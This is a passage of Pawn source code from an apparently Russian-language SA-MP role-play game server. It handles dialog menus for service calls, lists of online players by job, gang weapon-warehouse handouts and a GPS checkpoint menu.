	case 9956:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
				    CallLocalFunction("OnPlayerCommandText", "is", playerid, "/service call cop");
					//ShowPlayerDialogEx(playerid,9957,DIALOG_STYLE_INPUT,"Диспетчер",".\t\t\tОпишите где вы находитесь\t\t\t.","Готово","Отмена");
					return 1;
				}
			case 1:
				{
                    CallLocalFunction("OnPlayerCommandText", "is", playerid, "/service call medic");
					//ShowPlayerDialogEx(playerid,9958,DIALOG_STYLE_INPUT,"Диспетчер",".\t\t\tОпишите где вы находитесь\t\t\t.","Готово","Отмена");
					return 1;
				}
			case 2:
				{
				    CallLocalFunction("OnPlayerCommandText", "is", playerid, "/service call taxi");
					//ShowPlayerDialogEx(playerid,9959,DIALOG_STYLE_INPUT,"Диспетчер",".\t\t\tОпишите где вы находитесь\t\t\t.","Готово","Отмена");
					return 1;
				}
			case 3:
				{
					CallLocalFunction("OnPlayerCommandText", "is", playerid, "/service call mechanic");
					//ShowPlayerDialogEx(playerid,9960,DIALOG_STYLE_INPUT,"Диспетчер",".\t\t\tОпишите вашу ситуацию\t\t\t.","Готово","Отмена");
					return 1;
				}
			}
			CallLocalFunction("OnPlayerCommandText", "is", playerid, "/service call");
		}
	case 5454:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 5:
				{
					new giveplayer[MAX_PLAYER_NAME];
					SCM(playerid, 0xF10DEB10AA, " Адвокаты Online:");
					foreach(i)
					{
						if(PlayerInfo[i][pMember] == 7 && PlayerInfo[i][pRank] == 2 && PlayerInfo[i][pLogin] == 1)
						{
							GetPlayerName(i, giveplayer, sizeof(giveplayer));
							format(string, 256, " Адвокат: %s [тел: %i]", giveplayer, PlayerInfo[i][pPnumber]);
							SCM(playerid, 0xF999DEB9AA, string);
						}
					}
				}
			case 0:
				{
					new giveplayer[MAX_PLAYER_NAME];
					SCM(playerid, 0xF10DEB10AA, "Таксисты:");
					foreach(i)
					{
						if(PlayerInfo[i][pJob] != 4 || (!PlayerInfo[i][pLogin])) continue;
						GetPlayerName(i, giveplayer, sizeof(giveplayer));
						format(string, 256, "Таксист: %s [тел: %i]", giveplayer, PlayerInfo[i][pPnumber]);
						SCM(playerid, 0xF999DEB9AA, string);
					}
				}
			case 4:
				{
					if(IsPlayerConnected(playerid))
					{
						SCM(playerid, 0xF10DEB10AA, "Лидеры Online:");
						foreach(i)
						{
							if(PlayerInfo[i][pLeader]>0 && PlayerInfo[i][pLogin] == 1)
							{
								format(string, 144, " %s: %s [тел: %i]",GetFracName(PlayerInfo[i][pLeader]),Name(i),PlayerInfo[i][pPnumber]);
								SCM(playerid, 0xF99DEB9AA, string);
							}
						}
					}
				}
			case 6:
				{
					new giveplayer[MAX_PLAYER_NAME];
					SCM(playerid, 0xF10DEB10AA, "Развозчики продуктов:");
					foreach(i)
					{
						if(PlayerInfo[i][pJob] != 5) continue;
						GetPlayerName(i, giveplayer, sizeof(giveplayer));
						format(string, 256, " %s [тел: %i]", giveplayer, PlayerInfo[i][pPnumber]);
						SCM(playerid, 0xF999DEB9AA, string);
					}
				}
			case 1:
				{
					new giveplayer[MAX_PLAYER_NAME];
					SCM(playerid, 0xF10DEB10AA, "Механики:");
					foreach(i)
					{
						if(PlayerInfo[i][pJob] != 2) continue;
						GetPlayerName(i, giveplayer, sizeof(giveplayer));
						format(string, 256, " %s [тел: %i]", giveplayer, PlayerInfo[i][pPnumber]);
						SCM(playerid, 0xF999DEB9AA, string);
					}
				}
			case 2:
				{
					new giveplayer[MAX_PLAYER_NAME];
					SCM(playerid, 0xF10DEB10AA, "Прорабы:");
					foreach(i)
					{
						if(PlayerInfo[i][pJob] != 9) continue;
						GetPlayerName(i, giveplayer, sizeof(giveplayer));
						format(string, 256, " %s [тел: %i]", giveplayer, PlayerInfo[i][pPnumber]);
						SCM(playerid, 0xF999DEB9AA, string);
					}
				}
			case 3:
				{
					new giveplayer[MAX_PLAYER_NAME];
					SCM(playerid, 0xF10DEB10AA, "Медики:");
					foreach(i)
					{
						if(PlayerInfo[i][pMember] == 4 && PlayerInfo[i][pLogin] == 1 || PlayerInfo[i][pMember] == 22 && PlayerInfo[i][pLogin] == 1 || PlayerInfo[i][pMember] == 33 && PlayerInfo[i][pLogin] == 1)
						{
							GetPlayerName(i, giveplayer, sizeof(giveplayer));
							format(string, 256, " %s [тел: %i]", giveplayer, PlayerInfo[i][pPnumber]);
							SCM(playerid, 0xF999DEB9AA, string);
						}
					}
				}
			case 7:
				{
					new giveplayer[MAX_PLAYER_NAME];
					SCM(playerid, 0xF10DEB10AA, "Тренеры:");
					foreach(i)
					{
						if(PlayerInfo[i][pJob] != 6 || (!PlayerInfo[i][pLogin])) continue;
						GetPlayerName(i, giveplayer, sizeof(giveplayer));
						format(string, 256, " %s [тел: %i]", giveplayer, PlayerInfo[i][pPnumber]);
						SCM(playerid, 0xF999DEB9AA, string);
					}
				}
			}
		}
	case 8240:
		{
			if(response)
			{
				SetPlayerInterior(playerid,7);
				SetPlayerVirtualWorld(playerid, 15);
				SetPlayerPos(playerid,302.3128,-140.9305,1004.0625);
				SetPlayerFacingAngle(playerid, 318.5262);
				return true;
			}
			else
			{
				SetPlayerInterior(playerid, 0);
				SetPlayerPos(playerid,2278.3853,2460.9187,38.6837);
				SetPlayerFacingAngle(playerid, 357.9236);
				return true;
			}
		}
	case 8241:
		{
			if(response)
			{
				SetPlayerInterior(playerid,7);
				SetPlayerVirtualWorld(playerid, 15);
				SetPlayerPos(playerid,302.3128,-140.9305,1004.0625);
				SetPlayerFacingAngle(playerid, 318.5262);
				return true;
			}
			else
			{
				SetPlayerInterior(playerid, 0);
				SetPlayerPos(playerid,2294.0447,2468.8052,10.8203);
				SetPlayerFacingAngle(playerid, 90.8629);
				return true;
			}
		}
	case 2013:
		{
			if(!response) return true;
			new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
			ShowPlayerDialogEx(playerid, 2013, DIALOG_STYLE_LIST, "Взять оружие со склада", listitems, "Взять", "Отмена");
			switch(listitem)
			{
			case 0:
				{
					if(yakuzamats <= 50)return SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 24; ammo = 50;
					yakuzamats -= 70;
				}
			case 1:
				{
					if(yakuzamats <= 50)return SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 25; ammo = 15;
					yakuzamats -= 50;
				}
			case 2:
				{
					if(yakuzamats <= 50)return SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 33; ammo = 10;
					yakuzamats -= 100;
				}
			case 3:
				{
					if(yakuzamats <= 50)return SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 31; ammo = 100;
					yakuzamats -= 500;
				}
			case 4:
				{
					if(yakuzamats <= 50)return SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 30; ammo = 100;
					yakuzamats -= 500;
				}
			case 5:
				{
					if(yakuzamats <= 50)return SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 29; ammo = 200;
					yakuzamats -= 400;
				}
			case 6:
				{
					if(yakuzamats <= 50)return SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 23; ammo = 100; yakuzamats -= 100;
				}
			}
			if(booston == 0) GiveWeapon(getgunsid[playerid], gun, ammo);
			else if(booston == 1) GiveWeapon(getgunsid[playerid], gun, ammo*3);
			SendMes(playerid, COLOR_BLUE," На складе осталось %i материалов",yakuzamats);
			if(getgunsid[playerid] == playerid) format(string, 144, " %s взял(а) оружие со склада",PlayerInfo[playerid][pName]);
			else format(string, 144, " %s взял(а) оружие со склада и передал %s",PlayerInfo[playerid][pName],Name(getgunsid[playerid]));
			ProxDetector(20.0, playerid, string,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			return true;
		}
	case 2014:
		{
			if(!response) return true;
			new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
			ShowPlayerDialogEx(playerid, 2014, DIALOG_STYLE_LIST, "Взять оружие со склада", listitems, "Взять", "Отмена");
			switch(listitem)
			{
			case 0:
				{
					if(lcnmats <= 50) return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 24; ammo = 50; lcnmats -= 70;
				}
			case 1:
				{
					if(lcnmats <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 25; ammo = 15; lcnmats -= 50;
				}
			case 2:
				{
					if(lcnmats <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 33; ammo = 10; lcnmats -= 100;
				}
			case 3:
				{
					if(lcnmats <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 31; ammo = 100; lcnmats -= 500;
				}
			case 4:
				{
					if(lcnmats <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 30; ammo = 100; lcnmats -= 500;
				}
			case 5:
				{
					if(lcnmats <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 29; ammo = 200; lcnmats -= 400;
				}
			case 6:
				{
					if(lcnmats <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 23; ammo = 100; lcnmats -= 100;
				}
			}
			if(booston == 0) GiveWeapon(getgunsid[playerid], gun, ammo);
			else if(booston == 1) GiveWeapon(getgunsid[playerid], gun, ammo*3);
			SendMes(playerid, COLOR_BLUE," На складе осталось %i материалов",lcnmats);
			if(getgunsid[playerid] == playerid) format(string, 144, " %s взял(а) оружие со склада",PlayerInfo[playerid][pName]);
			else format(string, 144, " %s взял(а) оружие со склада и передал %s",PlayerInfo[playerid][pName],Name(getgunsid[playerid]));
			ProxDetector(20.0, playerid, string,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			return true;
		}
	case 2015:
		{
			if(!response) return true;
			new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
			ShowPlayerDialogEx(playerid, 2015, DIALOG_STYLE_LIST, "Взять оружие со склада", listitems, "Взять", "Отмена");
			switch(listitem)
			{
			case 0:
				{
					if(rmmats <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 24; ammo = 50; rmmats -= 70;
				}
			case 1:
				{
					if(rmmats <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 25; ammo = 15; rmmats -= 50;
				}
			case 2:
				{
					if(rmmats <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 33; ammo = 10; rmmats -= 100;
				}
			case 3:
				{
					if(rmmats <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 31; ammo = 100; rmmats -= 500;
				}
			case 4:
				{
					if(rmmats <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 30; ammo = 100; rmmats -= 500;
				}
			case 5:
				{
					if(rmmats <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 29; ammo = 200; rmmats -= 400;
				}
			case 6:
				{
					if(rmmats <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 23; ammo = 100; rmmats -= 100;
				}
			}
			if(booston == 0) GiveWeapon(getgunsid[playerid], gun, ammo);
			else if(booston == 1) GiveWeapon(getgunsid[playerid], gun, ammo*3);
			SendMes(playerid, COLOR_BLUE," На складе осталось %i материалов",rmmats);
			if(getgunsid[playerid] == playerid) format(string, 144, " %s взял(а) оружие со склада",PlayerInfo[playerid][pName]);
			else format(string, 144, " %s взял(а) оружие со склада и передал %s",PlayerInfo[playerid][pName],Name(getgunsid[playerid]));
			ProxDetector(20.0, playerid, string,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			return true;
		}
	case 2017:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					if(hamcmatbi <= 50)  return SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 24; ammo = 50; hamcmatbi -= 70;
				}
			case 1:
				{
					if(hamcmatbi <= 50)  return SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 25; ammo = 15; hamcmatbi -= 50;
				}
			case 2:
				{
					if(hamcmatbi <= 50)  return SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 33; ammo = 10; hamcmatbi -= 100;
				}
			case 3:
				{
					if(hamcmatbi <= 50)  return SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 31; ammo = 100; hamcmatbi -= 500;
				}
			case 4:
				{
					if(hamcmatbi <= 50)  return SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 30; ammo = 100; hamcmatbi -= 500;
				}
			case 5:
				{
					if(hamcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 29; ammo = 200; hamcmatbi -= 400;
				}
			case 6:
				{
					if(hamcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
					gun = 23; ammo = 100; hamcmatbi -= 100;
				}
			}
			new sendername[MAX_PLAYER_NAME];
			GetWeaponName(gun, gunname, sizeof(gunname));
			if(booston == 0) GiveWeapon(playerid, gun, ammo);
			else if(booston == 1) GiveWeapon(playerid, gun, ammo*3);
			format(string, 100, " Вы взяли оружие со склада");
			SCM(playerid, COLOR_BLUE, string);
			GetPlayerName(playerid,sendername,sizeof(sendername));
			format(string, 144, " %s взял(а) оружие со склада", sendername);
			ProxDetector(20.0, playerid, string,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			return true;
		}
	case 8001:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:{ShowPlayerDialogEx(playerid, 8002, DIALOG_STYLE_LIST, "Важные", "[0] Мэрия\n[1] Банк [LS]\n[2] Банк [SF]\n[3] Автошкола\n[4] Автовокзал [LS]\n[5] ЖД вокзал [LS]\n[6] Fort Carson\n[7] Приём металла\n[8] Наркопритон\n[9] Аэропорт [LS]\n[10] Аэропорт [SF]\n[11] Аэропорт [LV]\n[12] Пляж Santa Maria\n[13] Спортзал [LV]\n[14] Пеинтбол\n[15] Церковь", "Выбрать", "Назад");}
			case 1:{ShowPlayerDialogEx(playerid, 8005, DIALOG_STYLE_LIST, "По работе", "[0] Склад с алкоголем\n[1] Нефтезавод\n[2] Склад продуктов\n[3] Склад для урожая с ферм\n[4] Автобусный парк\n[5] Стоянка машин Хот догов\n[6] Работа грузчика\n[7] Склад с наркотиками\n[8] Автоугонщики", "Выбрать", "Назад");}
			case 2:
				{
					new strrr[900];
					new count = 0;
					for(new h = 1; h <= TotalBizz; h++)
					{
						format(YCMDstr, sizeof(YCMDstr),"[%i] %s\n",count, BizzInfo[h][bMessage]), strcat(strrr, YCMDstr); count ++;
						if (strlen(strrr) > 1) ShowPlayerDialogEx(playerid, 8006, DIALOG_STYLE_LIST, "Бизнесы", strrr, "Выбрать", "Назад");
					}
				}
			case 3:{ShowPlayerDialogEx(playerid, 8007, DIALOG_STYLE_LIST, "Магазины", "[0] Автосалон: Nope\n[1] Автосалон: D and C\n[2] Автосалон: B and A\n[3] Магазин одежды [LS]\n[4] Магазин одежды [SF]\n[5] Оружейный магазин [LS]\n[6] Оружейный магазин [SF]\n[7] Оружейный магазин [LV]", "Выбрать", "Назад");}
			case 4:
				{
					new dialog[600];
					strcat(dialog,"[0] Мэрия\n");
					strcat(dialog,"[1] Автошкола\n");
					strcat(dialog,"[2] Медики [LS]\n");
					strcat(dialog,"[3] Медики [SF]\n");
					strcat(dialog,"[4] Медики [LV]\n");
					strcat(dialog,"[5] Полиция [LS]\n");
					strcat(dialog,"[6] Полиция [SF]\n");
					strcat(dialog,"[7] Полиция [LV]\n");
					strcat(dialog,"[8] ФБР\n");
					strcat(dialog,"[9] Военная база [Авианосец]\n");
					strcat(dialog,"[10] Военная база [Зона 51]\n");
					strcat(dialog,"[11] Новости [LS]\n");
					strcat(dialog,"[12] Новости [SF]\n");
					strcat(dialog,"[13] Новости [LV]\n");
					strcat(dialog,"[14] Особняк Yakuza\n");
					strcat(dialog,"[15] Особняк Русской мафии\n");
					strcat(dialog,"[16] Особняк La Coca Nostra\n");
					strcat(dialog,"[17] Район Grove Street\n");
					strcat(dialog,"[18] Район Vagos\n");
					strcat(dialog,"[19] Район Ballas\n");
					strcat(dialog,"[20] Район Rifa\n");
					strcat(dialog,"[21] Район Aztecas\n");
					return ShowPlayerDialogEx(playerid, 8028, DIALOG_STYLE_LIST, "Базы организаций", dialog, "Выбрать", "Назад");
				}
			case 5:{ShowPlayerDialogEx(playerid, 8029, DIALOG_STYLE_LIST, "Фермы", "[0] Ферма номер: 0\n[1] Ферма номер: 1\n[2] Ферма номер: 2\n[3] Ферма номер: 3\n[4] Ферма номер: 4", "Выбрать", "Назад");}
			case 6:{ShowPlayerDialogEx(playerid, 8031, DIALOG_STYLE_LIST, "Дальнобойщики", "[0] Порт ЛС\n[1] Порт СФ\n[2] Нефтезавод №1\n[3] Нефтезавод №2\n[4] Склад угля №1\n[5] Склад угля №1\n[6] Лесопилка №1\n[7] Лесопилка №2\n[8] Аренда машин", "Выбрать", "Назад");}
			case 7:{ShowPlayerDialogEx(playerid, 8030, DIALOG_STYLE_LIST, "Клубы байкеров", "[0] Hell's Angels MC\n[1] Pagans MC\n[2] Warlocks MC", "Выбрать", "Назад");}
			case 8:
			{
			   format(string, 200, "Наименование\tДистанция\n\
			   [0] LS Repair\t{AE433D}%.1f {FFFFFF}метров\n\
			   [1] SF Repair\t{AE433D}%.1f {FFFFFF}метров\n\
			   [2] LV Repair\t{AE433D}%.1f {FFFFFF}метров",
			   GetPlayerDistanceFromPoint(playerid, sto_info[0][gps_x], sto_info[0][gps_y], sto_info[0][gps_z]),
			   GetPlayerDistanceFromPoint(playerid, sto_info[1][gps_x], sto_info[1][gps_y], sto_info[1][gps_z]),
			   GetPlayerDistanceFromPoint(playerid, sto_info[2][gps_x], sto_info[2][gps_y], sto_info[2][gps_z]));
  	           return ShowPlayerDialogEx(playerid, 8032, DIALOG_STYLE_TABLIST_HEADERS, "СТО", string, "Выбрать", "Назад");
			}
			}
		}
	case 8002:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 8001, DIALOG_STYLE_LIST, "GPS", "[0] Важные\n[1] По работе\n[2] Бизнесы\n[3] Магазины\n[4] Базы организаций\n[5] Фермы\n[6] Дальнобойщики\n[7] Клубы байкеров\n[8] СТО", "Выбрать", "Отмена");
			switch(listitem)
			{
			case 0: SetPlayerRaceCheckpoint(playerid,1, 1479.6614,-1741.5881,13.5469,0,0,0,2);
			case 1: SetPlayerRaceCheckpoint(playerid,1, 1418.4148,-1704.4663,13.5469,0,0,0,2);
			case 2: SetPlayerRaceCheckpoint(playerid,1, -2170.4336,252.5737,35.3351,0,0,0,2);
			case 3: SetPlayerRaceCheckpoint(playerid,1, -2029.6696,-96.3916,35.1641,0,0,0,2);
			case 4: SetPlayerRaceCheckpoint(playerid,1, 1148.0006,-1747.2552,13.5703,0,0,0,2);
			case 5: SetPlayerRaceCheckpoint(playerid,1, 1800.6935,-1896.7571,13.4045,0,0,0,2);
			case 6: SetPlayerRaceCheckpoint(playerid,1, -72.8030,1159.6533,19.7422,0,0,0,2);
			case 7: SetPlayerRaceCheckpoint(playerid,1, 2755.9060,-2515.5491,13.6397,0,0,0,2);
			case 8: SetPlayerRaceCheckpoint(playerid,1, 2182.8240,-1666.7662,14.7032,0,0,0,2);
			case 9: SetPlayerRaceCheckpoint(playerid,1, 1961.2422,-2181.9412,13.5469,0,0,0,2);
			case 10: SetPlayerRaceCheckpoint(playerid,1, -1549.4977,-438.6559,6.0000,0,0,0,2);
			case 11: SetPlayerRaceCheckpoint(playerid,1, 1718.0468,1610.3558,10.0079,0,0,0,2);
			case 12: SetPlayerRaceCheckpoint(playerid,1, 315.2710,-1784.7847,4.6507,0,0,0,2);
			case 13: SetPlayerRaceCheckpoint(playerid,1, 2094.8950,2475.4832,10.8203,0,0,0,2);
			case 14: SetPlayerRaceCheckpoint(playerid,1, 2586.3958,2790.0894,10.8203,0,0,0,2);
			case 15: SetPlayerRaceCheckpoint(playerid,1, -1982.9703,1115.3318,53.1268,0,0,0,2);
			}
			CP[playerid] = 776;
            format(string, 300, "{AE443D}'%s' {FFFFFF}помечано на карте красной меткой. Дистанция: {AE433D}%.1f {FFFFFF}метров", social_info[listitem][gps_t], GetPlayerDistanceFromPoint(playerid, social_info[listitem][gps_x], social_info[listitem][gps_y], social_info[listitem][gps_z]));
			SCM(playerid, -1, string);
		}
	case 8005:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 8001, DIALOG_STYLE_LIST, "GPS", "[0] Важные\n[1] По работе\n[2] Бизнесы\n[3] Магазины\n[4] Базы организаций\n[5] Фермы\n[6] Дальнобойщики\n[7] Клубы байкеров\n[8] СТО", "Выбрать", "Отмена");
			switch(listitem)
			{
			case 0: SetPlayerRaceCheckpoint(playerid,1, -20.6436,-300.6627,5.4229,0,0,0,2);
			case 1: SetPlayerRaceCheckpoint(playerid,1, -1028.2332,-596.7050,32.0078,0,0,0,2);
			case 2: SetPlayerRaceCheckpoint(playerid,1, -500.6603,-557.4494,25.5234,0,0,0,2);
			case 3: SetPlayerRaceCheckpoint(playerid,1, 1628.4138,2321.3416,10.8130,0,0,0,2);
			case 4: SetPlayerRaceCheckpoint(playerid,1, 1634.0817,-1152.8029,23.9063,0,0,0,2);
			case 5: SetPlayerRaceCheckpoint(playerid,1, -2432.1353,728.1223,35.0156,0,0,0,2);
			case 6: SetPlayerRaceCheckpoint(playerid,1, 2228.9771,-2214.3423,13.5469,0,0,0,2);
			case 7: SetPlayerRaceCheckpoint(playerid,1, 1280.6012,-1328.3436,13.3721,0,0,0,2);
			case 8: SetPlayerRaceCheckpoint(playerid,1, 2519.6055,-1463.4926,23.9785,0,0,0,2);
			}
			CP[playerid] = 776;
            format(string, 300, "{AE443D}'%s' {FFFFFF}помечано на карте красной меткой. Дистанция: {AE433D}%.1f {FFFFFF}метров", job_info[listitem][gps_t], GetPlayerDistanceFromPoint(playerid, job_info[listitem][gps_x], job_info[listitem][gps_y], job_info[listitem][gps_z]));
			SCM(playerid, -1, string);
		}
	case 8006:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 8001, DIALOG_STYLE_LIST, "GPS", "[0] Важные\n[1] По работе\n[2] Бизнесы\n[3] Магазины\n[4] Базы организаций\n[5] Фермы\n[6] Дальнобойщики\n[7] Клубы байкеров\n[8] СТО", "Выбрать", "Отмена");
			SetPlayerRaceCheckpoint(playerid, 1, BizzInfo[listitem+1][bEntranceX], BizzInfo[listitem+1][bEntranceY], BizzInfo[listitem+1][bEntranceZ],0,0,0,3.0);
			CP[playerid] = 776;
            format(string, 300, "{AE443D}'%s' {FFFFFF}помечано на карте красной меткой. Дистанция: {AE433D}%.1f {FFFFFF}метров", BizzInfo[listitem+1][bMessage], GetPlayerDistanceFromPoint(playerid, BizzInfo[listitem+1][bEntranceX], BizzInfo[listitem+1][bEntranceY], BizzInfo[listitem+1][bEntranceZ]));
			SCM(playerid, -1, string);
		}
	case 8007:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 8001, DIALOG_STYLE_LIST, "GPS", "[0] Важные\n[1] По работе\n[2] Бизнесы\n[3] Магазины\n[4] Базы организаций\n[5] Фермы\n[6] Дальнобойщики\n[7] Клубы байкеров\n[8] СТО", "Выбрать", "Отмена");
			switch(listitem)
			{
			case 0: SetPlayerRaceCheckpoint(playerid,1, 562.2973,-1291.6454,17.2482,0,0,0,2);
			case 1: SetPlayerRaceCheckpoint(playerid,1, -1952.2416,297.8349,35.4688,0,0,0,2);
			case 2: SetPlayerRaceCheckpoint(playerid,1, 2200.7192,1394.1440,11.0625,0,0,0,2);
			case 3: SetPlayerRaceCheckpoint(playerid,1, 455.8528,-1501.2737,31.0440,0,0,0,2);
			case 4: SetPlayerRaceCheckpoint(playerid,1, -1703.1656,941.8860,24.8906,0,0,0,2);
			case 5: SetPlayerRaceCheckpoint(playerid,1, 1361.7899,-1280.1626,13.3828,0,0,0,2);
			case 6: SetPlayerRaceCheckpoint(playerid,1, -2626.7271,212.4711,4.5982,0,0,0,2);
			case 7: SetPlayerRaceCheckpoint(playerid,1, 2154.7754,943.8470,10.8203,0,0,0,2);
			}
			CP[playerid] = 776;
            format(string, 300, "{AE443D}'%s' {FFFFFF}помечано на карте красной меткой. Дистанция: {AE433D}%.1f {FFFFFF}метров", shop_info[listitem][gps_t], GetPlayerDistanceFromPoint(playerid, shop_info[listitem][gps_x], shop_info[listitem][gps_y], shop_info[listitem][gps_z]));
			SCM(playerid, -1, string);
		}
	case 8028:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 8001, DIALOG_STYLE_LIST, "GPS", "[0] Важные\n[1] По работе\n[2] Бизнесы\n[3] Магазины\n[4] Базы организаций\n[5] Фермы\n[6] Дальнобойщики\n[7] Клубы байкеров\n[8] СТО", "Выбрать", "Отмена");
			switch(listitem)
			{
			case 0: SetPlayerRaceCheckpoint(playerid,1, 1479.6614,-1741.5881,13.5469,0,0,0,2);
			case 1: SetPlayerRaceCheckpoint(playerid,1, -2029.6696,-96.3916,35.1641,0,0,0,2);
			case 2: SetPlayerRaceCheckpoint(playerid,1, 1186.6284,-1324.4036,13.5592,0,0,0,2);
			case 3: SetPlayerRaceCheckpoint(playerid,1, -2662.4089,624.6633,14.4531,0,0,0,2);
			case 4: SetPlayerRaceCheckpoint(playerid,1, 1609.2395,1829.0909,10.8203,0,0,0,2);
			case 5: SetPlayerRaceCheckpoint(playerid,1, 1539.9977,-1676.8136,13.5497,0,0,0,2);
			case 6: SetPlayerRaceCheckpoint(playerid,1, -1605.5968,719.9384,11.9772,0,0,0,2);
			case 7: SetPlayerRaceCheckpoint(playerid,1, 2288.0718,2423.9084,10.8203,0,0,0,2);
			case 8: SetPlayerRaceCheckpoint(playerid,1, -2426.4136,496.5313,30.0703,0,0,0,2);
			case 9: SetPlayerRaceCheckpoint(playerid,1, -1341.7393,475.5054,7.1875,0,0,0,2);
			case 10: SetPlayerRaceCheckpoint(playerid,1, 86.9121,1913.2690,17.7896,0,0,0,2);
			case 11: SetPlayerRaceCheckpoint(playerid,1, 1630.2021,-1717.4863,13.4957,0,0,0,2);
			case 12: SetPlayerRaceCheckpoint(playerid,1, -2044.7574,462.1444,35.1719,0,0,0,2);
			case 13: SetPlayerRaceCheckpoint(playerid,1, 2646.0962,1178.4163,10.8203,0,0,0,2);
			case 14: SetPlayerRaceCheckpoint(playerid,1, 1463.7456,2773.4534,10.6719,0,0,0,2);
			case 15: SetPlayerRaceCheckpoint(playerid,1, 947.1475,1732.4764,8.8516,0,0,0,2);
			case 16: SetPlayerRaceCheckpoint(playerid,1, 1444.5669,749.3381,10.8203,0,0,0,2);
			case 17: SetPlayerRaceCheckpoint(playerid,1, 2466.5449,-1665.6993,13.4696,0,0,0,2);
			case 18: SetPlayerRaceCheckpoint(playerid,1, 2795.1541,-1594.1162,10.9269,0,0,0,2);
			case 19: SetPlayerRaceCheckpoint(playerid,1, 2706.2224,-1997.3385,13.5547,0,0,0,2);
			case 20: SetPlayerRaceCheckpoint(playerid,1, 2179.1306,-1760.8370,13.5469,0,0,0,2);
			case 21: SetPlayerRaceCheckpoint(playerid,1, 1702.7330,-2106.9773,13.5469,0,0,0,2);
			}
			CP[playerid] = 776;
            format(string, 300, "{AE443D}'%s' {FFFFFF}помечано на карте красной меткой. Дистанция: {AE433D}%.1f {FFFFFF}метров", frac_info[listitem][gps_t], GetPlayerDistanceFromPoint(playerid, frac_info[listitem][gps_x], frac_info[listitem][gps_y], frac_info[listitem][gps_z]));
			SCM(playerid, -1, string);
		}
	case 8029:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 8001, DIALOG_STYLE_LIST, "GPS", "[0] Важные\n[1] По работе\n[2] Бизнесы\n[3] Магазины\n[4] Базы организаций\n[5] Фермы\n[6] Дальнобойщики\n[7] Клубы байкеров\n[8] СТО", "Выбрать", "Отмена");
			switch(listitem)
			{
			case 0: SetPlayerRaceCheckpoint(playerid,1, -376.1135,-1410.9020,25.7266,0,0,0,2);
			case 1: SetPlayerRaceCheckpoint(playerid,1, -113.4650,-3.5923,3.1094,0,0,0,2);
			case 2: SetPlayerRaceCheckpoint(playerid,1, -1055.0795,-1195.0725,129.0927,0,0,0,2);
			case 3: SetPlayerRaceCheckpoint(playerid,1, 2.0902,74.6309,3.1172,0,0,0,2);
			case 4: SetPlayerRaceCheckpoint(playerid,1, 1926.3021,173.4447,37.2813,0,0,0,2);
			}
			CP[playerid] = 776;
